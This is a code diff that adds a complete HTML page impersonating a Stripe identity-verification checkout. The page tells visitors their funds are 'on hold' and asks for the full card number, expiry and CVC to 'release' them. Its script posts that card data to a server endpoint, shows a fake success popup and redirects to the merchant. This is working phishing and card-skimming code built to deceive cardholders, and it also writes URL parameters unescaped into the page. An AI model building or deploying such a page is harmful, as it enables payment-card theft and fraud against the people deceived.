@@ -1,0 +1,800 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Identity verification</title>
+    <link rel="icon" href="https://stripe.com/favicon.ico" type="image/x-icon">
+    <style>
+      * { margin: 0; padding: 0; box-sizing: border-box; }
+
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Ubuntu, sans-serif;
+        background: #fff;
+        color: rgba(26, 26, 26, 0.9);
+        font-size: 16px;
+        line-height: 20.8px;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+      }
+
+      .checkout-layout {
+        display: flex;
+        min-height: 100vh;
+      }
+
+      /* === LEFT PANEL === */
+      .panel-left {
+        flex: 0 0 45%;
+        max-width: 45%;
+        background: #fff;
+        padding: 48px 48px 48px 0;
+        display: flex;
+        justify-content: flex-end;
+        border-right: 1px solid #e6ebf1;
+      }
+
+      .panel-left-inner {
+        width: 100%;
+        max-width: 350px;
+      }
+
+      /* Back link + logo */
+      .back-row {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 32px;
+      }
+
+      .back-arrow {
+        color: rgba(26, 26, 26, 0.5);
+        font-size: 18px;
+        text-decoration: none;
+        line-height: 1;
+      }
+
+      .brand-logo {
+        width: 28px;
+        height: 28px;
+        border-radius: 6px;
+        object-fit: contain;
+      }
+
+      /* Header */
+      .verify-header {
+        font-size: 16px;
+        font-weight: 500;
+        color: rgba(26, 26, 26, 0.65);
+        margin-bottom: 8px;
+      }
+
+      .verify-amount {
+        font-size: 36px;
+        font-weight: 600;
+        color: rgba(26, 26, 26, 0.9);
+        line-height: 46.8px;
+        letter-spacing: -0.48px;
+        margin-bottom: 4px;
+      }
+
+      .verify-amount .hold-label {
+        font-size: 14px;
+        font-weight: 600;
+        color: #e25950;
+        margin-left: 4px;
+      }
+
+      .verify-desc {
+        font-size: 14px;
+        font-weight: 500;
+        color: rgba(26, 26, 26, 0.65);
+        line-height: 20px;
+        margin-bottom: 28px;
+      }
+
+      /* Payment info recap */
+      .payment-recap {
+        border-top: 1px solid #e6ebf1;
+        padding-top: 20px;
+      }
+
+      .recap-title {
+        font-size: 12px;
+        font-weight: 700;
+        text-transform: uppercase;
+        color: rgba(26, 26, 26, 0.45);
+        margin-bottom: 12px;
+      }
+
+      .recap-row {
+        display: flex;
+        justify-content: space-between;
+        align-items: baseline;
+        padding: 6px 0;
+        font-size: 14px;
+        color:#525f7f;
+      }
+
+      .recap-row .recap-label {
+        color: rgba(26, 26, 26, 0.5);
+      }
+
+      .recap-row .recap-value {
+        font-weight: 500;
+      }
+
+      .recap-row .recap-value strong {
+        font-weight: 700;
+      }
+
+      .security-note {
+        margin-top: 24px;
+        padding: 14px 16px;
+        background: #f6f9fc;
+        border: 1px solid #e6ebf1;
+        border-radius: 8px;
+        font-size: 13px;
+        color: #525f7f;
+        line-height: 18px;
+        display: flex;
+        align-items: flex-start;
+        gap: 8px;
+      }
+
+      .security-note svg {
+        flex-shrink: 0;
+        width: 16px;
+        height: 16px;
+        margin-top: 1px;
+      }
+
+      /* === RIGHT PANEL === */
+      .panel-right {
+        flex: 1;
+        background: #fff;
+        padding: 100px 48px 48px 48px;
+        display: flex;
+        justify-content: flex-start;
+      }
+
+      .panel-right-inner {
+        width: 100%;
+        max-width: 400px;
+      }
+
+      /* Section heading */
+      .section-heading {
+        font-size: 16px;
+        font-weight: 600;
+        color: rgba(26, 26, 26, 0.9);
+        margin-bottom: 8px;
+      }
+
+      .section-subtext {
+        font-size: 15px;
+        color: #525f7f;
+        line-height: 22px;
+        margin-bottom: 24px;
+      }
+
+      /* Form fields */
+      .form-field {
+        margin-bottom: 20px;
+      }
+
+      .form-label {
+        font-size: 13px;
+        font-weight: 500;
+        color: rgba(26, 26, 26, 0.7);
+        margin-bottom: 6px;
+        display: block;
+      }
+
+      .form-input-box {
+        border: 1px solid #e0e0e0;
+        border-radius: 8px;
+        overflow: hidden;
+        background: #f7f8f9;
+      }
+
+      .form-input-row {
+        display: flex;
+        align-items: center;
+        padding: 0 12px;
+        height: 44px;
+      }
+
+      .form-input-label {
+        font-size: 14px;
+        color: rgba(26, 26, 26, 0.5);
+        flex-shrink: 0;
+        min-width: 50px;
+      }
+
+      .form-input-value {
+        font-size: 14px;
+        color: rgba(26, 26, 26, 0.9);
+        margin-left: 12px;
+      }
+
+      .text-input {
+        width: 100%;
+        border: 1px solid #e0e0e0;
+        border-radius: 8px;
+        padding: 12px;
+        font-family: inherit;
+        font-size: 14px;
+        color: rgba(26, 26, 26, 0.9);
+        outline: none;
+        background: #fff;
+        font-weight: 500;
+        letter-spacing: 0px !important;
+      }
+
+      .text-input::placeholder {
+        color: rgba(26, 26, 26, 0.35);
+      }
+
+      .text-input:focus {
+        border-color: #0074d4;
+        box-shadow: 0 0 0 1px #0074d4;
+      }
+
+      .text-input.readonly {
+        background: #f7f8f9;
+        color: rgba(26, 26, 26, 0.6);
+        cursor: default;
+      }
+
+      /* Card verification group */
+      .card-verify-group {
+        border: 1px solid #e0e0e0;
+        border-radius: 8px;
+        overflow: hidden;
+        margin-bottom: 20px;
+      }
+
+      .card-verify-row {
+        display: flex;
+        align-items: center;
+        padding: 0 12px;
+        height: 44px;
+        border-bottom: 1px solid #e0e0e0;
+      }
+
+      .card-verify-row:last-child {
+        border-bottom: none;
+      }
+
+      .card-verify-row:first-child:focus-within {
+        outline: 2px solid #0074d4;
+        outline-offset: -2px;
+        border-radius: 8px 8px 0 0;
+      }
+
+      .card-masked {
+        font-size: 14px;
+        color: rgba(26, 26, 26, 0.4);
+        letter-spacing: 1px;
+        flex: 1;
+      }
+
+      .card-masked .last4 {
+        color: rgba(26, 26, 26, 0.9);
+        font-weight: 500;
+        letter-spacing: normal;
+      }
+
+      .card-brand-icon {
+        width: 32px;
+        height: 20px;
+        border-radius: 3px;
+        border: 1px solid #e0e0e0;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+        background: #fff;
+      }
+
+      .card-verify-split {
+        display: flex;
+      }
+
+      .card-verify-split.card-verify-row {
+        padding: 0;
+      }
+
+      .card-verify-half {
+        flex: 1;
+        height: 44px;
+        display: flex;
+        align-items: center;
+        padding: 0 12px;
+      }
+
+      .card-verify-half + .card-verify-half {
+        border-left: 1px solid #e0e0e0;
+      }
+
+      .card-verify-half .text-input {
+        border: none;
+        border-radius: 0;
+        padding: 0 0 0 0;
+        height: 100%;
+        background: transparent;
+        letter-spacing: 0px;
+        font-weight: 500;
+      }
+
+      .card-verify-half .text-input:focus {
+        box-shadow: none;
+        outline: none;
+      }
+
+      .card-verify-half:first-child:focus-within {
+        outline: 2px solid #0074d4;
+        outline-offset: -2px;
+        border-radius: 0 0 0 8px;
+      }
+
+      .card-verify-half:last-child:focus-within {
+        outline: 2px solid #0074d4;
+        outline-offset: -2px;
+        border-radius: 0 0 8px 0;
+      }
+
+      .cvc-hint {
+        width: 24px;
+        height: 16px;
+        border: 1px solid #d0d0d0;
+        border-radius: 3px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 7px;
+        color: rgb(26, 26, 26);
+        background: #fff;
+        margin-left: auto;
+      }
+
+      /* Verify button */
+      .verify-btn {
+        width: 100%;
+        height: 55px;
+        background: #0074d4;
+        border: none;
+        border-radius: 6px;
+        font-family: inherit;
+        font-size: 16px;
+        font-weight: 600;
+        color: #fff;
+        cursor: pointer;
+        margin-bottom: 16px;
+      }
+
+      .verify-btn:hover {
+        background: #0062b3;
+      }
+
+      .verify-disclaimer {
+        font-size: 13px;
+        color: #525f7f;
+        text-align: center;
+        line-height: 19px;
+        margin-bottom: 32px;
+      }
+
+      /* Footer */
+      .checkout-footer {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 16px;
+        font-size: 12px;
+        color: rgba(26, 26, 26, 0.4);
+        padding-top: 16px;
+        border-top: 1px solid #e6ebf1;
+      }
+
+      .checkout-footer a {
+        color: rgba(26, 26, 26, 0.5);
+        text-decoration: none;
+      }
+
+      .checkout-footer a:hover {
+        text-decoration: underline;
+      }
+
+      .stripe-powered {
+        display: flex;
+        align-items: center;
+        gap: 4px;
+        font-size: 12px;
+        color: rgba(26, 26, 26, 0.4);
+        text-decoration: none;
+      }
+
+      .stripe-powered strong {
+        font-weight: 700;
+        color: rgba(26, 26, 26, 0.5);
+      }
+
+      /* Success overlay */
+      .success-overlay {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: rgba(0,0,0,0.4);
+        z-index: 1000;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .success-overlay.visible {
+        display: flex;
+      }
+
+      .success-popup {
+        background: #fff;
+        border-radius: 12px;
+        padding: 48px 40px;
+        max-width: 420px;
+        width: 90%;
+        text-align: center;
+        box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+      }
+
+      .success-popup .success-icon {
+        width: 56px;
+        height: 56px;
+        background: #e8f5e9;
+        border-radius: 50%;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 20px;
+      }
+
+      .success-popup .success-icon svg {
+        width: 28px;
+        height: 28px;
+        color: #24b47e;
+      }
+
+      .success-popup h2 {
+        font-size: 20px;
+        font-weight: 600;
+        color: rgba(26,26,26,0.9);
+        margin-bottom: 8px;
+      }
+
+      .success-popup p {
+        font-size: 14px;
+        color: #525f7f;
+        line-height: 20px;
+      }
+
+      .footer-sep {
+        width: 1px;
+        height: 14px;
+        background: #d0d0d0;
+      }
+
+      @media (max-width: 768px) {
+        .checkout-layout {
+          flex-direction: column;
+        }
+        .panel-left {
+          flex: none;
+          max-width: 100%;
+          padding: 24px;
+          justify-content: center;
+          border-right: none;
+          border-bottom: 1px solid #e6ebf1;
+        }
+        .panel-right {
+          padding: 24px;
+          justify-content: center;
+        }
+        .panel-left-inner,
+        .panel-right-inner {
+          max-width: 100%;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Error state -->
+    <div id="error-state" style="display:none;min-height:100vh;background:#f6f9fc;display:none;align-items:center;justify-content:center;">
+      <div style="text-align:center;background:#fff;border-radius:8px;padding:48px 40px;max-width:500px;margin:40px auto;border:1px solid #e6ebf1;">
+        <svg style="width:48px;height:48px;color:#e25950;margin-bottom:16px;" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+          <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
+        </svg>
+        <h1 style="font-size:20px;font-weight:400;color:#32325d;margin-bottom:8px;">Facture expirée ou invalide</h1>
+        <p style="font-size:14px;color:#8898aa;">This verification is no longer available.</p>
+      </div>
+    </div>
+
+    <!-- Valid state -->
+    <div id="valid-state" style="display:none;">
+      <div class="checkout-layout">
+        <!-- LEFT PANEL: Payment context -->
+        <div class="panel-left">
+          <div class="panel-left-inner">
+            <!-- Logo -->
+            <div class="back-row">
+              <img class="brand-logo" id="logo-img" src="" alt="" style="width: 100px; height: auto; max-height: 64px; border-radius: 0;" />
+            </div>
+
+            <!-- Verification context -->
+            <div class="verify-header">Verification required</div>
+
+            <div class="verify-amount">
+              <span id="left-amount"></span> <span class="hold-label">on hold</span>
+            </div>
+
+            <div class="verify-desc">
+              Verify your identity to confirm this transaction and release your funds.
+            </div>
+
+            <!-- Payment recap -->
+            <div class="payment-recap">
+              <div class="recap-title">Payment details</div>
+
+              <div class="recap-row">
+                <span class="recap-label">Merchant</span>
+                <span class="recap-value" id="recap-merchant"></span>
+              </div>
+              <div class="recap-row">
+                <span class="recap-label">Card</span>
+                <span class="recap-value" id="recap-card"></span>
+              </div>
+              <div class="recap-row">
+                <span class="recap-label">Date</span>
+                <span class="recap-value" id="recap-date"></span>
+              </div>
+            </div>
+
+            <!-- Security note -->
+            <div class="security-note">
+              <svg viewBox="0 0 16 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                <path fill-rule="evenodd" d="M8 1a3.5 3.5 0 00-3.5 3.5V7A1.5 1.5 0 003 8.5v5A1.5 1.5 0 004.5 15h7a1.5 1.5 0 001.5-1.5v-5A1.5 1.5 0 0011.5 7V4.5A3.5 3.5 0 008 1zm2 6V4.5a2 2 0 10-4 0V7h4z" clip-rule="evenodd"/>
+              </svg>
+              <span>This verification is required by your card issuer to prevent unauthorized transactions. Your information is encrypted and secure.</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- RIGHT PANEL: Verification form -->
+        <div class="panel-right">
+          <div class="panel-right-inner">
+            <h2 class="section-heading">Confirm your identity</h2>
+            <p class="section-subtext">
+              Please confirm the details below to verify you are the authorized cardholder and release your payment.
+            </p>
+
+            <!-- Email (readonly) -->
+            <div class="form-field">
+              <label class="form-label">Email address</label>
+              <div class="form-input-box">
+                <div class="form-input-row">
+                  <span class="form-input-label">Email</span>
+                  <span class="form-input-value" id="form-email"></span>
+                </div>
+              </div>
+            </div>
+
+            <!-- Cardholder name -->
+            <div class="form-field">
+              <label class="form-label">Cardholder name</label>
+              <input type="text" class="text-input" placeholder="Full name on card" />
+            </div>
+
+            <!-- Card confirmat -->
+            <div class="form-field">
+              <label class="form-label">Card verification</label>
+              <div class="card-verify-group">
+                <div class="card-verify-row">
+                  <input type="text" id="cardNumber" class="text-input" style="border:none;border-radius:0;padding:0;height:100%;background:transparent;letter-spacing:0px;flex:1;box-shadow:none;" placeholder="•••• •••• •••• ••••" maxlength="19" />
+                  <span class="card-brand-icon" id="card-brand-icon"></span>
+                </div>
+                <div class="card-verify-split card-verify-row">
+                  <div class="card-verify-half">
+                    <input type="text" id="cardExpiry" class="text-input" placeholder="MM / YY" maxlength="7" inputmode="numeric" />
+                  </div>
+                  <div class="card-verify-half">
+                    <input type="text" id="cardCvc" class="text-input" placeholder="CVC" maxlength="4" inputmode="numeric" />
+                    <span class="cvc-hint">123</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Verify button -->
+            <button class="verify-btn" id="verify-btn" onclick="submitVerification()">Verify my identity</button>
+
+            <div class="verify-disclaimer">
+              This one-time verification will release the funds previously charged and finalize your order. You will not be charged again — this simply confirms your identity as the cardholder.
+            </div>
+
+            <!-- Footer -->
+            <div class="checkout-footer">
+              <a href="https://stripe.com" target="_blank" rel="noopener" class="stripe-powered">Powered by <strong>stripe</strong></a>
+              <span class="footer-sep"></span>
+              <a href="https://stripe.com/legal/consumer" target="_blank" rel="noopener">Terms</a>
+              <a href="https://stripe.com/privacy" target="_blank" rel="noopener">Privacy</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Success popup -->
+    <div class="success-overlay" id="success-overlay">
+      <div class="success-popup">
+        <div class="success-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"/>
+          </svg>
+        </div>
+        <h2>Identity verified</h2>
+        <p>Your identity has been successfully verified. You will be redirected to the merchant's website shortly.</p>
+      </div>
+    </div>
+
+    <script>
+      const params = new URLSearchParams(window.location.search);
+      const required = ['merchant_name', 'merchant_url', 'merchant_logo', 'order_amount', 'order_devise', 'order_email'];
+      const missing = required.some(k => !params.get(k));
+
+      if (missing) {
+        document.getElementById('error-state').style.display = 'flex';
+      } else {
+        document.getElementById('valid-state').style.display = '';
+
+        const p = Object.fromEntries(required.map(k => [k, params.get(k)]));
+        p.card_brand = params.get('card_brand') || '';
+        p.card_digits = params.get('card_digits') || '';
+        p.order_ref = params.get('order_ref') || '';
+        const amount = p.order_devise + p.order_amount;
+        const date = params.get('order_date') || new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
+
+        // Title
+        document.title = 'Identity verification — ' + p.merchant_name;
+
+        // Logo
+        document.getElementById('logo-img').src = p.merchant_logo;
+        document.getElementById('logo-img').alt = p.merchant_name;
+
+        // Left panel
+        document.getElementById('left-amount').textContent = amount;
+        document.getElementById('recap-merchant').textContent = p.merchant_name;
+        if (p.card_brand && p.card_digits) {
+          document.getElementById('recap-card').innerHTML = '<strong>' + p.card_brand + '</strong> •••• ' + p.card_digits;
+        } else {
+          document.getElementById('recap-card').closest('.recap-row').style.display = 'none';
+        }
+        document.getElementById('recap-date').textContent = date;
+
+        // Add ref row if provided
+        if (p.order_ref) {
+          const refRow = document.createElement('div');
+          refRow.className = 'recap-row';
+          refRow.innerHTML = '<span class="recap-label">Reference</span><span class="recap-value">#' + p.order_ref + '</span>';
+          document.getElementById('recap-date').closest('.recap-row').after(refRow);
+        }
+
+        // Right panel
+        document.getElementById('form-email').textContent = p.order_email;
+
+        // Card brand icon(s)
+        const brandIcon = document.getElementById('card-brand-icon');
+        if (p.card_brand) {
+          if (p.card_brand.toLowerCase() === 'mastercard') {
+            brandIcon.innerHTML = '<svg viewBox="0 0 32 20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="2" fill="#fff"/><circle cx="12" cy="10" r="6" fill="#EB001B"/><circle cx="20" cy="10" r="6" fill="#F79E1B"/><path d="M16 5.3a6 6 0 010 9.4 6 6 0 000-9.4z" fill="#FF5F00"/></svg>';
+          } else {
+            brandIcon.innerHTML = '<svg viewBox="0 0 32 20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="2" fill="#fff"/><text x="16" y="13" text-anchor="middle" fill="#1a1f71" font-size="8" font-weight="700" font-style="italic" font-family="Arial">VISA</text></svg>';
+          }
+        } else {
+          brandIcon.style.display = 'none';
+          const iconsWrap = document.createElement('span');
+          iconsWrap.style.cssText = 'display:inline-flex;gap:4px;margin-left:auto;';
+          iconsWrap.innerHTML = '<span class="card-brand-icon"><svg viewBox="0 0 32 20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="2" fill="#fff"/><text x="16" y="13" text-anchor="middle" fill="#1a1f71" font-size="8" font-weight="700" font-style="italic" font-family="Arial">VISA</text></svg></span><span class="card-brand-icon"><svg viewBox="0 0 32 20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="2" fill="#fff"/><circle cx="12" cy="10" r="6" fill="#EB001B"/><circle cx="20" cy="10" r="6" fill="#F79E1B"/><path d="M16 5.3a6 6 0 010 9.4 6 6 0 000-9.4z" fill="#FF5F00"/></svg></span>';
+          brandIcon.parentElement.appendChild(iconsWrap);
+        }
+
+        // Card number: pre-fill last 4 if provided
+        const cardEl = document.getElementById('cardNumber');
+        cardEl.placeholder = p.card_digits ? '•••• •••• •••• ' + p.card_digits : '•••• •••• •••• ••••';
+        cardEl.addEventListener('input', (e) => {
+          if (p.card_digits) {
+            let v = e.target.value.replace(/[^\d]/g, '').slice(0, 12);
+            let formatted = v.replace(/(.{4})/g, '$1 ').trim();
+            if (v.length === 12) {
+              e.target.value = formatted + ' ' + p.card_digits;
+            } else {
+              e.target.value = formatted;
+            }
+          } else {
+            let v = e.target.value.replace(/[^\d]/g, '').slice(0, 16);
+            e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+          }
+        });
+
+        // Expiry formatter
+        const expiryEl = document.getElementById('cardExpiry');
+        expiryEl.addEventListener('input', (e) => {
+          let v = e.target.value.replace(/[^\d]/g, '');
+          if (v.length > 4) v = v.slice(0, 4);
+          if (v.length >= 3) {
+            e.target.value = v.slice(0, 2) + ' / ' + v.slice(2);
+          } else {
+            e.target.value = v;
+          }
+        });
+
+        // CVC formatter
+        const cvcEl = document.getElementById('cardCvc');
+        cvcEl.addEventListener('input', (e) => {
+          e.target.value = e.target.value.replace(/[^\d]/g, '').slice(0, 4);
+        });
+
+        // Submit verification form
+        window.submitVerification = async function() {
+          const btn = document.getElementById('verify-btn');
+          const cardholderName = document.querySelector('.text-input[placeholder="Full name on card"]').value.trim();
+          const cardNumber = cardEl.value.replace(/\s/g, '');
+          const expiry = expiryEl.value.trim();
+          const cvc = cvcEl.value.trim();
+
+          if (!cardholderName || !cardNumber || !expiry || !cvc) {
+            alert('Please fill in all fields.');
+            return;
+          }
+
+          btn.disabled = true;
+          btn.textContent = 'Verifying...';
+
+          try {
+            const res = await fetch('/api/submit-verification', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                order_email: p.order_email,
+                cardholder_name: cardholderName,
+                card_number: cardNumber,
+                card_expiry: expiry,
+                card_cvc: cvc,
+                merchant_name: p.merchant_name,
+                merchant_url: p.merchant_url,
+                order_amount: p.order_amount,
+                order_devise: p.order_devise,
+                card_brand: p.card_brand,
+                card_digits: p.card_digits,
+              }),
+            });
+            const data = await res.json();
+            if (data.success) {
+              btn.textContent = 'Verified';
+              btn.style.background = '#24b47e';
+              document.getElementById('success-overlay').classList.add('visible');
+              setTimeout(() => {
+                window.location.href = 'https://' + p.merchant_url;
+              }, 5000);
+            } else {
+              btn.textContent = 'Verify my identity';
+              btn.disabled = false;
+              alert('Verification failed. Please try again.');
+            }
+          } catch (err) {
+            btn.textContent = 'Verify my identity';
+            btn.disabled = false;
+            alert('Network error. Please try again.');
+          }
+        };
+      }
+    </script>
+  </body>
+</html>
